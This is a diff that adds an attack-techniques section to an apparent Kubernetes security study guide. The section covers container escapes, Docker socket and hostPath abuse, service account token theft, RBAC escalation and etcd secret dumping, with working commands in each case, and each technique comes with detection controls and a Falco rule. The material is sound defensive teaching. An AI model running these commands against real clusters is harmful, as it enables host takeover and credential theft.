@@ -118,6 +118,350 @@ Begin with the fundamentals of how containers actually work — namespaces, cgro
 
 ---
 
+## Attacking Container Environments
+
+Understanding how attackers compromise container environments is essential for building effective defenses. The techniques below represent the most common and impactful attack paths observed in real-world incidents and penetration tests. Each technique is explained at the mechanism level — knowing *why* it works helps you understand what controls actually prevent it.
+
+### Container Escape Techniques
+
+A container escape is any technique that allows a process running inside a container to gain access to the host OS or other containers on the same node. Containers are not a security boundary by default — they are a process isolation mechanism. The Linux kernel is shared, and most escape techniques exploit the gap between "isolation" and "true isolation."
+
+**Privileged Container Escape**
+
+When a container is launched with `--privileged` (or `securityContext.privileged: true` in Kubernetes), the container receives nearly all Linux capabilities and direct access to host devices. The kernel no longer enforces namespace isolation for device access. This is one of the most common misconfigurations found in CI/CD pipelines, monitoring agents, and developer convenience deployments.
+
+```bash
+# Attacker is inside a privileged container.
+# List host block devices — visible because --privileged removes device namespace restrictions.
+ls /dev/sd*
+
+# Mount the host root filesystem into /mnt inside the container.
+# Works because CAP_SYS_ADMIN (granted by --privileged) allows arbitrary mounts,
+# and the container sees host block devices directly through the device namespace.
+mount /dev/sda1 /mnt
+
+# Chroot into the mounted host filesystem for full host access.
+# The container boundary is gone — the attacker now operates as root on the host OS.
+chroot /mnt /bin/bash
+```
+
+*Why it works:* `--privileged` disables most kernel namespace enforcement and grants the full Linux capability set. Capabilities like `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, and `CAP_SYS_PTRACE` each independently enable powerful escape primitives. The privileged flag is conceptually equivalent to giving the container root on the host.
+
+*Detection:* Falco rule `container_privileged` fires when any container starts with `privileged: true`. kube-bench check 5.2.1 flags pods using privileged mode. Tetragon detects `mount` syscalls issued from container context.
+
+---
+
+**nsenter — Joining Host Namespaces**
+
+Linux namespaces are the kernel feature that makes containers feel isolated: each container gets its own PID, network, mount, and UTS namespace. The `nsenter` tool joins an *existing* namespace by referencing another process's `/proc/<pid>/ns/*` file descriptors. Running `nsenter --target 1` from inside a container requests entry into PID 1's namespaces — which belong to the host init process, outside all container isolation.
+
+```bash
+# nsenter --target 1 joins the namespaces of PID 1 (the host init / systemd process).
+# --mount  joins the host mount namespace (sees all host filesystems and block devices)
+# --uts    joins the host UTS namespace (hostname becomes the node hostname)
+# --ipc    joins the host IPC namespace (host shared memory, semaphore sets)
+# --net    joins the host network namespace (sees all host interfaces and routing)
+# --pid    joins the host PID namespace (can see, signal, and ptrace host processes)
+#
+# Requires CAP_SYS_PTRACE or CAP_SYS_ADMIN and visibility to host PID 1 namespace.
+# Both conditions are satisfied in --privileged containers and pods with hostPID: true.
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+```
+
+*Why it works:* Namespace access is gated only by a capability check. Any process with the right capabilities can legally ask the kernel to switch into any namespace it can reference via a `/proc/<pid>/ns/` file descriptor. There is no membership requirement — only a capability check.
+
+*Detection:* Falco's `nsenter_container_escape` rule detects `nsenter` execution from container context. Tetragon can enforce a kernel-level policy blocking `setns` syscalls (the underlying call `nsenter` uses) from any container context.
+
+---
+
+**Docker Socket Abuse**
+
+The Docker daemon socket at `/var/run/docker.sock` is the Unix socket through which the Docker CLI communicates with the Docker daemon (which runs as root on the host). Mounting this socket into a container gives that container root on the host: any process inside the container can issue Docker API commands that the daemon executes with root privileges, including creating new privileged containers that mount the host filesystem.
+
+This misconfiguration is extremely common in CI/CD environments: Jenkins agents, GitLab Runners configured for Docker-in-Docker, and certain monitoring tools frequently mount the Docker socket.
+
+```bash
+# Confirm the Docker socket is accessible inside the container.
+ls -la /var/run/docker.sock
+
+# Use the Docker CLI to launch a new privileged container that mounts the host root.
+# The Docker daemon — running as root — creates this container on behalf of the attacker.
+# No kernel exploit required: we are instructing the privileged daemon to comply.
+docker run -v /:/hostfs --rm -it ubuntu:latest chroot /hostfs /bin/bash
+
+# Alternative: use the raw Docker REST API via curl (no Docker CLI binary needed).
+# Step 1: Create the container.
+curl --unix-socket /var/run/docker.sock \
+  -X POST "http://localhost/containers/create" \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}'
+
+# Step 2: Start the container using the ID from the Step 1 response.
+curl --unix-socket /var/run/docker.sock \
+  -X POST "http://localhost/containers/<CONTAINER_ID>/start"
+```
+
+*Why it works:* The Docker daemon is a privileged root process. Its socket has no authentication beyond Unix filesystem permissions. Anyone who can write to the socket can instruct the daemon to perform any operation — including creating new privileged containers with host filesystem mounts.
+
+*Detection:* Falco detects reads and writes to `/var/run/docker.sock` from container processes. OPA Gatekeeper and Kyverno policies block pods declaring `/var/run/docker.sock` as a `hostPath` volume. Any admission webhook should reject pod specs mounting the Docker socket path.
+
+---
+
+**hostPath Volume Abuse**
+
+Kubernetes `hostPath` volumes mount a path from the node filesystem directly into a pod. An attacker who can create or modify pod specs can use `hostPath` to read sensitive node files (kubelet credentials, PKI keys, `/etc/shadow`) or write files that execute on the host (cron jobs, SSH `authorized_keys`, systemd unit files).
+
+```yaml
+# Malicious pod spec requesting the entire host root filesystem via hostPath.
+# Without an admission controller blocking unrestricted hostPath mounts,
+# this pod provides read/write access to the complete node filesystem.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostpath-escape
+spec:
+  containers:
+  - name: attacker
+    image: ubuntu:latest
+    command: ["/bin/sh", "-c", "sleep 3600"]
+    volumeMounts:
+    - mountPath: /hostfs      # container-side mount point for the host filesystem
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /                  # entire host filesystem exposed to the container
+      type: Directory
+```
+
+```bash
+# Read the node kubelet kubeconfig — contains TLS client credentials the kubelet
+# uses to authenticate to the API server; stealing these allows impersonating the node.
+kubectl exec hostpath-escape -- cat /hostfs/etc/kubernetes/kubelet.conf
+
+# Write an SSH public key to root authorized_keys on the node for persistent access.
+kubectl exec hostpath-escape -- \
+  sh -c 'mkdir -p /hostfs/root/.ssh && echo "ssh-rsa AAAA..." >> /hostfs/root/.ssh/authorized_keys'
+```
+
+*Why it works:* The kubelet mounts the declared hostPath volume with no kernel namespace preventing the container from accessing host files at that mount point. The pod runs as root by default unless explicitly prevented, giving read/write access to any node file reachable from the container.
+
+*Detection:* OPA Gatekeeper `K8sPSPHostFilesystem` policy blocks unrestricted hostPath mounts. kube-bench 5.2.7 flags pods using hostPath volumes. Falco rule `read_sensitive_file_trusted_after_startup` catches sensitive file access from container context. The [BadPods](https://github.com/BishopFox/badpods) project provides nine pod specs for testing each dangerous permission class.
+
+---
+
+**Kernel Exploit Container Escapes**
+
+Because containers share the host kernel, any kernel vulnerability exploitable from an unprivileged user namespace can break container isolation completely. Historical examples with high real-world impact:
+
+| CVE | Name | Kernel Range | Mechanism |
+|---|---|---|---|
+| CVE-2016-5195 | Dirty COW | < 4.8.3 | Race condition in copy-on-write; SUID binary overwrite achievable from container |
+| CVE-2019-5736 | runc overwrite | runc < 1.0-rc6 | Container process overwrites the host runc binary during exec; achieves host root on next container operation |
+| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 | Pipe splice flaw; overwrite arbitrary read-only file pages including SUID binaries in host kernel page cache |
+| CVE-2022-23648 | containerd path traversal | containerd < 1.4.13 | Spec parsing flaw; read arbitrary host files via specially crafted container image |
+
+*Why it works:* Kernel exploits operate below the namespace and capability model. They corrupt kernel data structures or exploit race conditions in kernel code directly. Container isolation is irrelevant once an attacker achieves kernel code execution or can overwrite kernel-mapped pages.
+
+*Detection:* The primary mitigation is keeping node OS kernels patched. gVisor and Kata Containers provide the strongest defense: kernel exploits from inside a gVisor container target the Go-implemented gVisor kernel, not the host kernel. Seccomp profiles reduce the available syscall attack surface. kube-bench 4.2.6 checks that the kubelet uses a current and secure OS image.
+
+---
+
+### Kubernetes Cluster Compromise
+
+Beyond escaping individual containers, attackers who gain any foothold pursue lateral movement and privilege escalation at the orchestration layer.
+
+**Unauthenticated API Server Access**
+
+The Kubernetes API server is the cluster control plane — every operation passes through it. Clusters misconfigured with `--anonymous-auth=true` and permissive RBAC for `system:anonymous` can allow full unauthenticated cluster control.
+
+```bash
+# Probe the API server for unauthenticated access.
+# A response containing pod listings without credentials means full compromise.
+curl -sk https://<API_SERVER_IP>:6443/api/v1/pods
+
+# kube-hunter performs automated active discovery of this and related misconfigurations.
+kube-hunter --remote <API_SERVER_IP>
+
+# If anonymous access is confirmed, enumerate the full cluster state.
+kubectl --server https://<API_SERVER_IP>:6443 --insecure-skip-tls-verify \
+  get pods,secrets,configmaps --all-namespaces
+```
+
+*Detection:* kube-bench 1.2.1 checks `--anonymous-auth=false`. kube-bench 1.2.6 checks `--authorization-mode` includes `Node,RBAC`. Kubernetes audit logs record every API server request including source IP and user identity — anonymous requests are immediately identifiable.
+
+---
+
+**Service Account Token Abuse**
+
+Every pod is automatically mounted with a service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This JWT authenticates to the API server. If the service account has overly broad RBAC permissions, any attacker who compromises a pod in that namespace inherits those permissions.
+
+```bash
+# Extract the mounted SA token and CA cert — present in every pod by default
+# unless automountServiceAccountToken is explicitly disabled.
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+APISERVER=https://kubernetes.default.svc
+
+# If the SA can list secrets, this dumps all secrets in the namespace —
+# including other SA tokens, TLS certificates, database passwords, and API keys.
+curl -s --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces/default/secrets
+
+# Enumerate the RBAC permissions the current SA actually holds.
+curl -s --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
+  -H "Content-Type: application/json" \
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets","namespace":"default"}}}'
+```
+
+*Detection:* Disable automatic token mounting where not needed (`automountServiceAccountToken: false`). Apply RBAC least privilege — service accounts should have only the specific permissions the workload requires. Falco detects unexpected reads of the SA token by non-application processes. KubiScan identifies overprivileged service accounts cluster-wide.
+
+---
+
+**RBAC Privilege Escalation**
+
+Any RBAC permission that allows creating or modifying cluster resources can be leveraged to gain higher permissions, because Kubernetes resources are the mechanism through which code execution happens.
+
+```bash
+# Path 1: ClusterRoleBinding creation -> cluster-admin
+# If the compromised identity can create clusterrolebindings,
+# it can grant cluster-admin to any subject it controls.
+kubectl create clusterrolebinding pwned \
+  --clusterrole=cluster-admin \
+  --serviceaccount=default:compromised-sa
+
+# Path 2: Pod creation with hostPath -> node root
+# create pods permission allows deploying a hostPath pod (see above) for node escape.
+
+# Path 3: Pod exec -> code execution in running containers
+# pods/exec allows running arbitrary commands in any permitted pod, including
+# privileged pods in kube-system with host access.
+kubectl exec -n kube-system <privileged-pod-name> -- /bin/bash
+
+# Enumerate the current identity's full RBAC permissions.
+kubectl auth can-i --list
+kubectl auth can-i --list --as=system:serviceaccount:default:target-sa
+
+# rakkess generates a complete permission matrix across all API resources and verbs.
+kubectl rakkess
+```
+
+*Detection:* KubiScan continuously scans for RBAC configurations that permit privilege escalation. Kubernetes audit logs capture all RBAC-mutating API calls. Falco detects `ClusterRoleBinding` creation events. The `rbac-tool` visualizes permission graphs to surface escalation paths.
+
+---
+
+**etcd Access — Direct Credential Extraction**
+
+etcd is the key-value store backing all Kubernetes cluster state. An attacker with direct etcd network access bypasses RBAC entirely — the authorization layer applies only to the API server, not to direct etcd access. Before Kubernetes 1.13, Secrets were stored as base64-encoded plaintext.
+
+```bash
+# If etcd lacks mutual TLS client authentication, dump the entire cluster state.
+ETCDCTL_API=3 etcdctl \
+  --endpoints=https://<ETCD_IP>:2379 \
+  --insecure-skip-tls-verify \
+  get / --prefix --keys-only
+
+# Extract all Kubernetes Secrets directly from etcd, bypassing RBAC entirely.
+# Pre-1.13: base64 only. Post-1.13 with EncryptionConfiguration: AES-encrypted,
+# but the encryption key itself must also be secured.
+ETCDCTL_API=3 etcdctl \
+  --endpoints=https://<ETCD_IP>:2379 \
+  --insecure-skip-tls-verify \
+  get /registry/secrets --prefix | strings
+```
+
+*Detection:* kube-bench 2.1 checks etcd requires TLS client certificate authentication. kube-bench 1.2.34 checks secrets are encrypted at rest via `EncryptionConfiguration`. Network segmentation is the primary mitigation: etcd port 2379 should be reachable only from control plane nodes.
+
+---
+
+### Common Attack Tools
+
+| Tool | Purpose | Key Use Case |
+|---|---|---|
+| [kube-hunter](https://github.com/aquasecurity/kube-hunter) | Kubernetes attack surface discovery | Scans from inside or outside a cluster for exposed API servers, anonymous access, open ports, and RBAC weaknesses; generates a prioritized finding report |
+| [CDK (Container DucK)](https://github.com/cdk-team/CDK) | Container exploitation toolkit | Post-exploitation from inside containers; auto-detects escape paths, Docker socket, SA token, cloud metadata SSRF, and deploys reverse shells |
+| [BadPods](https://github.com/BishopFox/badpods) | Reference pod specs for dangerous permissions | Nine pod manifests each testing one dangerous permission class (hostPID, hostNetwork, hostPath /, privileged, etc.); validates admission controller coverage |
+| [Peirates](https://github.com/inguardians/peirates) | Kubernetes post-exploitation | SA token harvesting, RBAC enumeration, secret extraction, pod deployment for node escape; Kubernetes-specific post-exploitation framework |
+| [KubiScan](https://github.com/cyberark/KubiScan) | RBAC risk scanning | Identifies risky roles, overprivileged role bindings, and SA escalation paths without requiring active exploitation |
+| [etcdctl](https://github.com/etcd-io/etcd) | etcd direct interaction | Dump cluster state when etcd is accessible; verify encryption-at-rest configuration as a defender |
+
+**CDK — Automated Container Escape Triage**
+
+CDK automates detection of which escape techniques are viable in the current container environment — useful for rapidly assessing attack surface after landing in an unknown container.
+
+```bash
+# CDK evaluate auto-detects all available escape paths in the current container.
+# Checks: privileged mode, Docker socket, hostPath mounts, writable cgroup release_agent,
+# kernel version vs. known CVEs, cloud metadata service reachability (AWS/GCP/Azure), and more.
+./cdk evaluate
+
+# CDK can also automate exploitation of discovered paths:
+./cdk run docker-sock-exploit    # Docker socket escape if socket is present
+./cdk run mount-cgroup           # cgroup release_agent escape
+```
+
+**Peirates — Kubernetes Post-Exploitation**
+
+```bash
+# Peirates provides an interactive post-exploitation menu for Kubernetes.
+# It auto-reads the mounted SA token and CA cert, authenticates to the API server,
+# and presents attack options based on the permissions the current SA actually holds.
+./peirates
+
+# Key capabilities via the interactive menu:
+# - List and extract all secrets the SA token can read
+# - Deploy pods with hostPath mounts for node escape
+# - Enumerate which nodes the SA can schedule workloads to
+# - Attempt RBAC escalation via known dangerous permission patterns
+# - Harvest SA tokens from all pods in the namespace
+```
+
+---
+
+### How Defenders Detect Each Technique
+
+| Attack Technique | Falco Detection | kube-bench Check | Preventive Control |
+|---|---|---|---|
+| Privileged container launch | `container_privileged` rule | 5.2.1 — Prohibit privileged containers | Gatekeeper `K8sPSPPrivilegedContainer`; Pod Security Standards restricted profile |
+| nsenter / setns from container | `nsenter_container_escape` rule | 5.2.2 — Prohibit root containers | Tetragon blocking `setns` syscall from container context; `hostPID: false` in pod spec |
+| Docker socket mount | Socket read detection rules | 5.2.7 — Prohibit hostPath | Kyverno/Gatekeeper blocking `/var/run/docker.sock` in hostPath |
+| Sensitive hostPath mount | `read_sensitive_file_trusted_after_startup` | 5.2.7 — Prohibit/restrict hostPath | Gatekeeper `K8sPSPHostFilesystem` with explicit safe-path allowlist |
+| SA token read by unexpected process | `read_sensitive_file` rule on `/var/run/secrets/` | 5.1.6 — Do not bind default SA to active roles | `automountServiceAccountToken: false`; RBAC least privilege per workload |
+| Anonymous API server access | Audit log: `user=system:anonymous` | 1.2.1 — `--anonymous-auth=false` | Network policy blocking external access to API server port 6443 |
+| ClusterRoleBinding escalation | Audit log: create/patch on `clusterrolebindings` | 5.1.1 — Restrict cluster-admin | KubiScan continuous monitoring; Gatekeeper blocking wildcard RBAC grants |
+| etcd unauthenticated access | N/A (network layer) | 2.1 — etcd TLS client auth; 1.2.34 — secrets encrypted at rest | Network segmentation; etcd port 2379 control-plane-only |
+| Cryptomining workload (T1496) | `detect_crypto_miners_using_the_cpu` rule | N/A | Tetragon process execution policy; egress NetworkPolicy blocking mining pool IP ranges |
+| Container filesystem write | `write_below_binary_dir` rule | N/A | `readOnlyRootFilesystem: true` in pod securityContext |
+
+**Example Falco Rule: Unexpected Service Account Token Read**
+
+```yaml
+- rule: Unexpected Service Account Token Read
+  desc: >
+    A process other than the expected application binary read the Kubernetes
+    service account token. This is a strong indicator of post-exploitation:
+    an attacker inside the container is harvesting the SA token to authenticate
+    to the Kubernetes API server and enumerate cluster resources or escalate privileges.
+  condition: >
+    open_read
+    and fd.name startswith "/var/run/secrets/kubernetes.io/serviceaccount/token"
+    and not proc.name in (expected_app_binaries)
+    and container
+  output: >
+    Unexpected SA token read (user=%user.name command=%proc.cmdline file=%fd.name
+    container_id=%container.id image=%container.image.repository:%container.image.tag
+    k8s_pod=%k8s.pod.name k8s_ns=%k8s.ns.name)
+  priority: WARNING
+  tags: [container, kubernetes, credential_access, T1552.007]
+```
+
+For high-security environments, Tetragon can enforce this as a kernel-level policy that *blocks* the read rather than only alerting on it.
+
+---
+
 ## Certifications
 
 - **CKS** (Certified Kubernetes Security Specialist — CNCF) — The premier Kubernetes security certification; covers cluster hardening, system hardening, minimizing microservice vulnerabilities, supply chain security, monitoring, and runtime security; requires CKA as prerequisite; the most respected credential for Kubernetes security practitioners
